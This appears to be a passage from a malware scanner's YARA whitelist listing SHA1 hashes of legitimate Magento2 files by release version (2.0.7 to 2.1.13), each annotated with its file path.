		/* Magento2 2.0.7 */
		hash.sha1(0, filesize) == "50729d6c9165838ca734cd8286cdf6fe118ed533" or // vendor/sebastian/environment/src/Console.php
		
		/* Magento2 2.0.8 */
		hash.sha1(0, filesize) == "e1328d0b46579ef478a04d1e26e17b70c905052d" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "2f54337e672d3c5be8860cbe7b0e168bc0712a68" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "fdce42474a273767544ca7f6523f5fa746ee2986" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/TokensTest.php
		hash.sha1(0, filesize) == "e4446c8664ba8e523afe6276ff3d74c2464fc196" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/Transformer/DynamicVarBraceTest.php
		hash.sha1(0, filesize) == "385e32ecaaaa3a0c41adc65de81ea120d218cf82" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/PSR2/BracesFixerTest.php
		hash.sha1(0, filesize) == "5b3d6eb358bbec82eb1ba43631cf9e4be786a227" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/UnneededControlParenthesesFixerTest.php
		hash.sha1(0, filesize) == "02de582f2d14ebc6bb2822c75a4bf547e55efe9f" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/NewWithBracesFixerTest.php
		
		/* Magento2 2.0.9 */
		hash.sha1(0, filesize) == "78df93e21f17c38ba43d3ff5ce35dea223b867e1" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/PSR2/BracesFixerTest.php
		
		/* Magento2 2.0.10 */
		hash.sha1(0, filesize) == "2fb8066ba8f7a6509ca5483a8cf436e0f8692c2a" or // vendor/symfony/process/ExecutableFinder.php
		hash.sha1(0, filesize) == "e1023b6db60214d8af90a29fc499cf4e559825b8" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "4d484b8c942943b66095429aeb3dbc5f7043c33e" or // vendor/seld/jsonlint/bin/jsonlint
		hash.sha1(0, filesize) == "23ba985a4971dfd9cca89f21e0b236172048d222" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tokenizer/Transformer/DynamicVarBrace.php
		hash.sha1(0, filesize) == "030764f1b7821cc2d84644961c37620da2d90f61" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Fixer/Symfony/PhpdocShortDescriptionFixer.php
		hash.sha1(0, filesize) == "4d484b8c942943b66095429aeb3dbc5f7043c33e" or // vendor/bin/jsonlint
		
		/* Magento2 2.0.11 */
		hash.sha1(0, filesize) == "c5e894f794e51cbe8e2880bc8d3ca66cdf03cc7c" or // app/code/Magento/Quote/Api/CartRepositoryInterface.php
		hash.sha1(0, filesize) == "e9121ed645f2c14e6823d538f2fd178b397e8a0c" or // app/code/Magento/Quote/Api/GuestPaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "b8bb6b6d02da2fdd37175c761fa97d783c41fc82" or // app/code/Magento/Quote/Api/PaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "39e3e7114633b0e34c857f0870993aac7e22f194" or // app/code/Magento/SalesRule/Api/RuleRepositoryInterface.php
		hash.sha1(0, filesize) == "f22f4f8bc8c4e523ece560c6deeb19dad0901fb1" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "156edf7756b2c963de57a8ca24d82235c104dd99" or // app/code/Magento/Sales/Api/InvoiceRepositoryInterface.php
		hash.sha1(0, filesize) == "2129b5635fff163dae53baebe5d1757bff12b94a" or // app/code/Magento/Sales/Api/TransactionRepositoryInterface.php
		hash.sha1(0, filesize) == "a6a47849ce9bca1fb77c6a79881a71225077066b" or // app/code/Magento/Sales/Api/OrderItemRepositoryInterface.php
		hash.sha1(0, filesize) == "467525aff9535f9f0c0aef54d7d08fa6e47a7c74" or // app/code/Magento/Sales/Api/ShipmentRepositoryInterface.php
		hash.sha1(0, filesize) == "8d5b554f736f880a8ece739853af0cc48bb5a812" or // app/code/Magento/Sales/Api/CreditmemoRepositoryInterface.php
		hash.sha1(0, filesize) == "91fffd76393bb2c842979f3b692bbefa7c5aeb16" or // app/code/Magento/Sales/Api/OrderRepositoryInterface.php
		hash.sha1(0, filesize) == "f42cc5335de5f06535e8e077206e177a9c896637" or // app/code/Magento/Tax/Api/TaxClassRepositoryInterface.php
		hash.sha1(0, filesize) == "021e596bb7a67a5a938e4a845701a69f82b45b57" or // app/code/Magento/Tax/Api/TaxRuleRepositoryInterface.php
		hash.sha1(0, filesize) == "8c2ae1628d5444fc225c331b0a9b804338fd2e1b" or // app/code/Magento/Tax/Api/TaxRateRepositoryInterface.php
		hash.sha1(0, filesize) == "d61d6b62141e345c12ad4efbbc335b6753472f2d" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "1baf421486a3f9643effa9682c9e233889e1202f" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "4f697b5a0c0f1a596769e6320ae6615f2557992d" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "5da62035633518dca120b129e4f633966bf1dbf5" or // app/code/Magento/Eav/Api/AttributeSetRepositoryInterface.php
		hash.sha1(0, filesize) == "24474e40bd0f47603105df1e9440ec4ad3604b49" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "9f6856d545db59534fa19e9484d63c6262a27e6b" or // vendor/symfony/process/ExecutableFinder.php
		hash.sha1(0, filesize) == "85753e9603a8257660ca373f5dd1ec54043ff183" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "efb174da3eba83465a2b22c41724a38ab021adc3" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "fe66d643505f98a8701e16a16df941db1e013acd" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.0.12 */
		hash.sha1(0, filesize) == "29509547a3df49795cd94499b8e5186a0d631f50" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "3a921750e6d75d4c48ffc27325a5e599ebe0268a" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "368ee3a68a2dd9486ac0592cddc9956656daea26" or // vendor/magento/zendframework1/library/Zend/Locale/Format.php
		hash.sha1(0, filesize) == "d92effc195a34f3ef57ef1019e9517fd87fdb21a" or // vendor/composer/composer/src/Composer/Util/Git.php
		hash.sha1(0, filesize) == "648c71bf728c5ac30a78669003a5f8ac04db08c3" or // vendor/composer/composer/src/Composer/Command/ShowCommand.php
		hash.sha1(0, filesize) == "f8d7d78a68a7a454a3800a8ac16c1c7b9ad749f2" or // vendor/composer/composer/src/Composer/Command/ConfigCommand.php
		
		/* Magento2 2.0.13 */
		hash.sha1(0, filesize) == "ddead59890d2c99e76e468094d68fc419cbabbe7" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "3c024cef3450f55e1f2dc50d757eb6bda8e0aa9c" or // app/code/Magento/Quote/Api/CartRepositoryInterface.php
		hash.sha1(0, filesize) == "83e83fba96501b3453a4a0b7ab2f36b7426749f1" or // app/code/Magento/Quote/Api/GuestPaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "01dbe0bbf6b9cb214410f2ff38181d8d164a53ef" or // app/code/Magento/Quote/Api/PaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "17ea2b0b2d2bdc3cdccdd5dff2a7246768049180" or // app/code/Magento/SalesRule/Api/RuleRepositoryInterface.php
		hash.sha1(0, filesize) == "b7b54740e243add6033baca3770f76146c7b9ba5" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "0717b4bb444caec9679d7c0d6f6e9abb9442670b" or // app/code/Magento/Sales/Api/InvoiceRepositoryInterface.php
		hash.sha1(0, filesize) == "5b871a979d648fe6474e232c656b92274e8abbf4" or // app/code/Magento/Sales/Api/TransactionRepositoryInterface.php
		hash.sha1(0, filesize) == "5bcf446b284592eb9e4c64ad87b317a73fa5f463" or // app/code/Magento/Sales/Api/OrderItemRepositoryInterface.php
		hash.sha1(0, filesize) == "2c52f35481456d3c8dac49cd1ecc25792e0ae2d7" or // app/code/Magento/Sales/Api/ShipmentRepositoryInterface.php
		hash.sha1(0, filesize) == "e121a225b0d12d2e4c03eac6deb45aa6c11249fb" or // app/code/Magento/Sales/Api/CreditmemoRepositoryInterface.php
		hash.sha1(0, filesize) == "d466f44dfb788cea74af332178be3442ad0de7e9" or // app/code/Magento/Sales/Api/OrderRepositoryInterface.php
		hash.sha1(0, filesize) == "da9512c83a01edcb7562377f1c41bc1be93a15ed" or // app/code/Magento/Tax/Api/TaxClassRepositoryInterface.php
		hash.sha1(0, filesize) == "b0627f6c3fc7571b81f7c677a5d2bf287e0b55ff" or // app/code/Magento/Tax/Api/TaxRuleRepositoryInterface.php
		hash.sha1(0, filesize) == "5aea5bcef2771467d3e4c84dd304217c3d096872" or // app/code/Magento/Tax/Api/TaxRateRepositoryInterface.php
		hash.sha1(0, filesize) == "e49284de86eac76c768ad5013c7ca71be0869305" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "d89a4ba6245d4d8a24fe1d98c86ecd2ec4b40dcc" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "e74fc9b2dad2b6cab8b22e7d96ebc49a7cae9896" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "09abaf69f729ab2922aeda3fa8475d67795a2d7b" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "59da4d114e17ddb20be53460cde1aba2868e2d30" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "de5c49a3b9703f4f95584575d970654b3e6b839f" or // app/code/Magento/Eav/Api/AttributeSetRepositoryInterface.php
		hash.sha1(0, filesize) == "08902d712ff9dd3e6c09a7c208992af082f9c757" or // dev/tests/js/JsTestDriver/run_js_tests.php
		hash.sha1(0, filesize) == "cacb07cec83967672afa69ef06bfd0ca456a1f58" or // dev/tests/api-functional/framework/bootstrap.php
		hash.sha1(0, filesize) == "111c13f7fa513fcf3f4438fe57bb7c049c12ddfe" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "050602a0e718f4bcbdbd4bac123dac20bb9d6bd0" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "c734de5a7d259c8d04d7ab33ab8d3fd5d7df795f" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "008fa7b844781b883d85d947cc089262c798cd8c" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "4398f0d56d5a74097ec5899c3a1714aaa6e28088" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "07d218a9f05e1ba2ae5e06908c4a7cfbdf07325c" or // lib/internal/Magento/Framework/Shell.php
		hash.sha1(0, filesize) == "2c831eeb01158462fb44fd12a3e52a00a23cd89c" or // lib/internal/Magento/Framework/View/Design/Theme/Validator.php
		hash.sha1(0, filesize) == "7c0acbee4469e930b0a3da3f143fe36e77b0c347" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "15282670aaed1d3f1fcc8247adc45de8546669c7" or // lib/internal/Magento/Framework/Filter/Test/Unit/TranslitTest.php
		hash.sha1(0, filesize) == "1294e45f10b4b4eb609c3b0654562317176abd49" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "22ec9304340b38564305bf9e32d11b416bdf75d8" or // lib/internal/Magento/Framework/Validator/Constraint/Option/Callback.php
		
		/* Magento2 2.0.14 */
		hash.sha1(0, filesize) == "6ed1dcee63761ea913b67ca03ded42e96f590b36" or // vendor/symfony/process/ExecutableFinder.php
		hash.sha1(0, filesize) == "aeffdf582ee6179f0df53cfc5fb508d30c79ca23" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "592ebc85426d16e61a417c1a603836f9b53811ab" or // vendor/symfony/process/Tests/ExecutableFinderTest.php
		hash.sha1(0, filesize) == "1f9ca2f9b4eb4c3bc7b5d5638e0b0e361b995a36" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "2f559ac195c2c93bb28ed025e7a6851bda5cbfa9" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.0.15 */
		hash.sha1(0, filesize) == "91e0f69fbdf38d8e6e3ccfa0f8e806b1530be8e1" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "49f41cbd82a981cd6bd8f97ba13630b910fd8685" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.0.16 */
		hash.sha1(0, filesize) == "557045c6b3132e37a8b9b48c8ee6a26df50b8763" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "94f6f8ce54742d8b479760d681c0442df4fd3514" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "4e6118b35adcc7088377d58bdb1436267524e343" or // vendor/seld/jsonlint/bin/jsonlint
		hash.sha1(0, filesize) == "4e6118b35adcc7088377d58bdb1436267524e343" or // vendor/bin/jsonlint
		
		/* Magento2 2.0.17 */
		hash.sha1(0, filesize) == "a788f8a799221cb24ddb7a8aeb33624e2cb476fc" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "963fb2ff6cf89995cb0b5fcac45d57dab9183d69" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "7fe6433f36919db43e23effd68a89f6d610865cc" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "bdf1fcbe43cdf5200e7e28bd25e845e8d731bc14" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "c4854bc0249e0f970521cc1cf57446f14309ff8c" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.0.18 */
		hash.sha1(0, filesize) == "b9e783094ae318eb8e8b57d83a6f81395d4b8807" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "cedd6b5448398afd9466997142f7c2438f2c932f" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "ac8139452995845aea88df75c02376eaf1e3a5f2" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "c8157cd5255c95c69498ae8fd5a57ec0015d1bdf" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		hash.sha1(0, filesize) == "11dbfaf75f2187398d49ea4a25878ef9342496af" or // vendor/seld/jsonlint/bin/jsonlint
		hash.sha1(0, filesize) == "11dbfaf75f2187398d49ea4a25878ef9342496af" or // vendor/bin/jsonlint
		
		/* Magento2 2.1.0 */
		hash.sha1(0, filesize) == "64459becc8ec0520996804beba4aaba8fa18e558" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "883a1d6ca14a96231887768babe9e8a0cd0800f4" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "1ef83ad7c62a035a71c786d2dd7de7fa993b88c9" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "0e4193c10af5017d0c2fd9300556d25b536e2251" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "85c69f4a3cfbe9670990523ba2c4be0225e5f5a0" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "181aac8d1a67fe106fa750933e6d2fe2194c889e" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "25d56e294e9852fbddbbb377cc55dc46fa0d2976" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "8bd120bbe2369df9f9056d49fa6f4a6c62637bc4" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "b8762bbde3a0202e289634005163291a8ee1cdb5" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "7ac6acb23d445922fbed93d4e19f14517ea710f9" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "92f71e0f24fbb82eb1c761102930594d0299717e" or // lib/internal/Magento/Framework/Shell/Driver.php
		hash.sha1(0, filesize) == "645a3175c03748862cffc45423f2af030ecc361a" or // vendor/oyejorge/less.php/lib/Less/Tree/Dimension.php
		hash.sha1(0, filesize) == "f392af8f698d1d7faefbcc0d357eba20c1040459" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "4e4ea26e0b80aedffec3b35057fd0496f74262c2" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH1.php
		hash.sha1(0, filesize) == "b9cd8abb45de04dedb9c5391d2440cc22c1cba6a" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "33c6049f790a9d9629ad0334cb0cb775a12990b1" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "44d33c9aabf64223a32610b719ad77666050b6dc" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Tokenizer/TokensTest.php
		hash.sha1(0, filesize) == "7af3018c4d08ebdeb88e072aab9e8909831a45b3" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/PSR2/BracesFixerTest.php
		hash.sha1(0, filesize) == "ae2c48bace90c07184b7f1e5b5dbf863ca6a5b75" or // vendor/fabpot/php-cs-fixer/Symfony/CS/Tests/Fixer/Symfony/NewWithBracesFixerTest.php
		
		/* Magento2 2.1.1 */
		hash.sha1(0, filesize) == "4b8a3269b7fb4d1bfc438a531f5675b44b01ba52" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		
		/* Magento2 2.1.2 */
		
		/* Magento2 2.1.3 */
		hash.sha1(0, filesize) == "76be172c911fee3eab5d821edde580e5805ed368" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "f68d5ea111181a2f292a0505159171b9711818e2" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "b48e85037627b2836145f25c6c7f459cff4b3cb2" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		
		/* Magento2 2.1.4 */
		hash.sha1(0, filesize) == "1b63becf463667081e723caa0696f1b1b67437db" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		
		/* Magento2 2.1.5 */
		hash.sha1(0, filesize) == "fa63bf2a0264c0044254c8e2dcc814ac7d8bddb2" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "395458537df4051959c333ac7271c8a863150789" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "229f6fcbfcd1713d616f2bb89f7c8c9a31a2deb4" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "456f9f8ead4e7b606f1b35669bd2dac104e421fc" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "02578d94159f1d88b32d9c0861055485cb7391fa" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "3f846c514532a7488b3268e62137cbef443d2471" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "843e8f286a4cf51ca5aa532beb07b0f0a64aa32e" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "32401af11c757b96d8f65085b420861125fa3090" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "1004650dd15224d6dffe8fe72e409091b357afa2" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "5687d9871695c46aebfc6af286ee984654f93a82" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "cd1039bdd8d22ea99ffbcbdcbb05c5cb1a50b5e5" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "d161688212ad42208d4c587f0530fba696fd0aca" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "5d327ec6c10da280b80958c76c030dec0a9de35e" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "d8a6ed90677727852f0b20f6112d08c1da149818" or // lib/internal/Magento/Framework/Shell/Driver.php
		
		/* Magento2 2.1.6 */
		hash.sha1(0, filesize) == "e6078d183e380a919948c3b3b4971c5e049747d4" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "d302d6e931b946f47aa9ae5c42a99e59317777a5" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		
		/* Magento2 2.1.7 */
		hash.sha1(0, filesize) == "bc8ae673be1f6d1253401f2347c1c115b2eb709c" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "370f0f3a2475c045746d732e55d8a0e069096c7b" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH1.php
		hash.sha1(0, filesize) == "46f2ec3159015327b7ced7e1f438cc9c27c280bf" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "30e1d4a9b8330866f6819b6d0450fc541b8bca24" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		hash.sha1(0, filesize) == "36d64a870bc04baf47a885a9c3806fd5b0d24023" or // vendor/pdepend/pdepend/src/bin/pdepend
		hash.sha1(0, filesize) == "36d64a870bc04baf47a885a9c3806fd5b0d24023" or // vendor/bin/pdepend
		
		/* Magento2 2.1.8 */
		hash.sha1(0, filesize) == "ffab57b32ad85e87e337f09e74c57dcfe5e1501b" or // lib/web/tiny_mce/tiny_mce_jquery_src.js
		hash.sha1(0, filesize) == "b7740681dc35c16ed01413b7e627655442a1cce0" or // lib/web/tiny_mce/tiny_mce_prototype_src.js
		hash.sha1(0, filesize) == "4772981059bba37ee951778fe941d81d56cf18f4" or // lib/web/tiny_mce/tiny_mce_src.js
		hash.sha1(0, filesize) == "398718704aad62d1cf8c17987b1ce355b5e99ea9" or // setup/src/Magento/Setup/Model/FixtureGenerator/BundleProductGenerator.php
		hash.sha1(0, filesize) == "00fbcf8ef6037fd2391c98dc33a66848a28937d9" or // setup/src/Magento/Setup/Model/FixtureGenerator/ProductGenerator.php
		
		/* Magento2 2.1.9 */
		hash.sha1(0, filesize) == "ac29b321ea84532f0acec3409b3ba30a7e64c998" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "930713b472a4e7a847fff028975761d98f7fe767" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "c11ff15722cc309480b728064bc7b438bc953f02" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		
		/* Magento2 2.1.10 */
		hash.sha1(0, filesize) == "dd3c76c21f587f44be23d457a1a1b8637bb30b47" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "44d8fa56264b9bdec449b1d9ea57d39596954971" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "cc3f72d557f455a2007da806998b8b763c38c131" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "a23bb20be73c3ab8405cf1264469048dc22d027e" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH1.php
		hash.sha1(0, filesize) == "6e53c5dbbdf61a9cfa527ab2882303118dd03692" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.1.11 */
		hash.sha1(0, filesize) == "cd3b469c4b1503d15d2cca1a797be5a5512dc141" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "c129cce146f4c256bf67e1457400afd813bfa677" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "da379747dcf7875aaaeeb5a7033f23609518c4b9" or // vendor/symfony/process/Process.php
		hash.sha1(0, filesize) == "5eaec66ad7c4e08384550cea788aaf774f8aed8c" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.1.12 */
		hash.sha1(0, filesize) == "086c176ae4e7e5646fef9d1bd59b7bca237cd770" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/links.phtml
		hash.sha1(0, filesize) == "6a4ac438335055f2c6c11e55ab1999c215f14e19" or // dev/tests/api-functional/framework/bootstrap.php
		hash.sha1(0, filesize) == "dc9bcdad8e1dcacabf1bb1c7911a9e3442b71739" or // vendor/phpseclib/phpseclib/phpseclib/Net/SSH2.php
		hash.sha1(0, filesize) == "3c18c3e87cc8a0acd751a3d00cf214a66a0238fd" or // vendor/phpseclib/phpseclib/phpseclib/Net/SFTP/Stream.php
		hash.sha1(0, filesize) == "5d98e7c19aa3de7357d2db989b8073f7ca42a63c" or // vendor/symfony/filesystem/Tests/FilesystemTest.php
		
		/* Magento2 2.1.13 */
		hash.sha1(0, filesize) == "7c51edd333a7b2018cf4df44c80a94c5b99e7300" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "24756173c733960651944ebc84fca62b5ebe4700" or // app/code/Magento/Quote/Api/CartRepositoryInterface.php
		hash.sha1(0, filesize) == "44e349e59c1b9ab3197874065916af15bf55bd8d" or // app/code/Magento/Quote/Api/GuestPaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "fbd29c51a445f7822ef9b571716f9b4ddc70b7d2" or // app/code/Magento/Quote/Api/PaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "d8a4719ec45463b2f24c2c402e217b669f47e865" or // app/code/Magento/SalesRule/Api/RuleRepositoryInterface.php
		hash.sha1(0, filesize) == "927662c6812bde2292995180f11009d2ab564fdf" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "64c683ac71020dda7a65fc9f246ab3931c389b3a" or // app/code/Magento/Sales/Api/InvoiceRepositoryInterface.php
		hash.sha1(0, filesize) == "8970e14580ef6a85920d23d285b42b1d50fe3b0f" or // app/code/Magento/Sales/Api/TransactionRepositoryInterface.php
		hash.sha1(0, filesize) == "112ce2a27bd9ccfe39bd6fe422f0c1dd00535ed4" or // app/code/Magento/Sales/Api/OrderItemRepositoryInterface.php
		hash.sha1(0, filesize) == "cb41fcc6f7ff5005387f1d3952bb59859cefa6af" or // app/code/Magento/Sales/Api/ShipmentRepositoryInterface.php
		hash.sha1(0, filesize) == "92c27bde01b4e9f005b0244668f872f1b063645b" or // app/code/Magento/Sales/Api/CreditmemoRepositoryInterface.php
		hash.sha1(0, filesize) == "c11e08cc70ea47f9c76c0252c47342ea0dcc63cd" or // app/code/Magento/Sales/Api/OrderRepositoryInterface.php
		hash.sha1(0, filesize) == "a1e8b6b6cece2378a626fcd7640caeb575807a81" or // app/code/Magento/Tax/Api/TaxClassRepositoryInterface.php
		hash.sha1(0, filesize) == "e8f824853c18d7956ad402d15584c884e022e279" or // app/code/Magento/Tax/Api/TaxRuleRepositoryInterface.php
		hash.sha1(0, filesize) == "e37c36c6c67d6c0726472bc792bbd96b76487ec9" or // app/code/Magento/Tax/Api/TaxRateRepositoryInterface.php
		hash.sha1(0, filesize) == "366915b0c87c90d23c1516c88ddfce085aff3055" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "eee01dbf0891bf294a6e72dcab9ec79b27558a5a" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/links.phtml
		hash.sha1(0, filesize) == "61598b8e555ed8e00cb6fdd1a3bd9ae8c2db5631" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "5bcc966ecf955e4c7df5e93cfb502c367ec36170" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "3d8308628c5ac8518017d2655501b41fa2e04e4a" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "6a7131f77cd11804e2f607f4acca903761bbe444" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "3178b409e706058fdf9d96180444b779e411ecc9" or // app/code/Magento/Eav/Api/AttributeSetRepositoryInterface.php
		hash.sha1(0, filesize) == "d43603dee33dc0e3368f09c2e759e59239e309b5" or // dev/tests/js/JsTestDriver/run_js_tests.php
